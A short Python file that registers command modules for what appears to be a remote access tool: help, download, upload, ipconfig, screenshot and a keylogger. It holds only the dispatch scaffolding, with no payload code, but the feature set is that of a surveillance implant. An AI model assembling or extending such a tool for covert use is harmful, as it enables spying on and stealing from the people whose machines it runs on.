from .help import HelpCommand
from .download import DownloadCommand
from .ipconfig import IPConfigCommand
from .keylogger import KeyloggerCommand
from .upload import UploadCommand
from .screenshot import ScreenshotCommand


class CommandRegistry:
    def __init__(self):
        self.commands = {}

        self.register(HelpCommand())
        self.register(DownloadCommand())
        self.register(IPConfigCommand())
        self.register(KeyloggerCommand())
        self.register(UploadCommand())
        self.register(ScreenshotCommand())

    def register(self, command):
        self.commands[command.name] = command

    def get(self, name):
        return self.commands.get(name)
